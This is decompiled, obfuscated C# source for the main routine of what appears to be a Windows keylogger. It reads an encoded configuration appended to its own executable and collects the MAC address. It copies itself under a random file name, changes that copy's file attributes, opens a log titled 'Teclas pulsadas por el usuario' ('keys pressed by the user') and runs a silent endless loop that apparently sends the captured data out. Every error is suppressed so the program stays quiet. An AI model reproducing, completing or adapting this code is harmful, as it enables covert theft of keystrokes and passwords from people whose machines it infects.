using System;
using System.IO;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal static class Class7
{
	[STAThread]
	private static void Main()
	{
		Class10 @class = new Class10();
		StreamReader streamReader = new StreamReader(Application.get_ExecutablePath());
		BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream);
		byte[] array = binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
		binaryReader.Close();
		streamReader.Close();
		int num = Encoding.ASCII.GetString(array).IndexOf("-||-");
		string @string = Encoding.ASCII.GetString(array, num, array.Length - num);
		@string = @string.Replace("-||-", string.Empty);
		string[] array2 = @string.Split(new char[1] { '¬' });
		string[] array3 = Class2.smethod_1(array2[0]).Split(new char[1] { '¬' });
		try
		{
			Class5.string_1 = array3[1];
		}
		catch
		{
		}
		try
		{
			Class5.string_0 = array3[0];
		}
		catch
		{
		}
		try
		{
			Class5.string_2 = NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
		}
		catch
		{
		}
		try
		{
			Class3 class2 = new Class3(Application.get_ExecutablePath());
			string text = string.Empty;
			string empty = string.Empty;
			bool flag;
			if (!(flag = class2.method_0("win32")))
			{
				text = Path.GetRandomFileName().Replace(".", string.Empty);
				empty = Class6.smethod_3() + "\\" + text + ".txt";
			}
			else
			{
				empty = class2.method_1("win32").Replace(".exe", ".txt");
			}
			try
			{
				GClass0 gClass = new GClass0(empty);
				gClass.method_3(Convert.ToDouble(15000));
				gClass.method_1(bool_0: true);
				StreamWriter streamWriter = new StreamWriter(empty, append: true);
				streamWriter.WriteLine("Teclas pulsadas por el usuario:\r\n");
				streamWriter.Close();
				Class3 class3 = new Class3(empty);
				class3.method_4();
			}
			catch
			{
			}
			if (!flag)
			{
				try
				{
					class2.method_4();
					empty = Class6.smethod_3() + "\\" + text + ".exe";
					class2.method_3(empty);
					class2 = new Class3(empty);
					class2.method_2((Class3.Enum0)0);
					class2.method_4();
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			Class8.smethod_12();
		}
		catch
		{
		}
		while (true)
		{
			try
			{
				while (true)
				{
					if (Class5.smethod_0())
					{
						try
						{
							Class5.smethod_1(Class6.smethod_1());
						}
						catch
						{
						}
						try
						{
							@class.method_0();
						}
						catch
						{
						}
						try
						{
							@class.method_1();
						}
						catch
						{
							Console.WriteLine("Error no hay XML cargado");
						}
					}
					try
					{
						Thread.Sleep(2000);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
	}
}
